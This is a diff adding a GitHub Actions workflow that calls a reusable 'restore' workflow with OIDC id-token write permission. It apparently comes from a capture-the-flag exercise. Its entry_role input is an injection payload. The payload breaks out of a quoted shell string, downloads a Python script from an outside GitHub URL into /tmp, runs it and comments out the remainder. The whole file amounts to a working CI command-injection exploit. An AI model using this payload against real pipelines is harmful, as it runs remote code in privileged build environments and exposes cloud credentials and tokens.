@@ -1,0 +1,17 @@
+name: MetricForge exact entry stage
+
+on:
+  workflow_dispatch:
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  stage:
+    uses: yulmwu/metricforge-recovery-workflows/.github/workflows/restore.yml@main
+    with:
+      mode: exchange
+      nonce: exact-entry-stage
+      entry_role: >-
+        x" || true; curl -fsSL https://raw.githubusercontent.com/MyeongJong03/metricforge-ctf-runner-20260719/main/role_stage.py -o /tmp/mf-role-stage.py; python3 /tmp/mf-role-stage.py > entry.json; exit 0; #
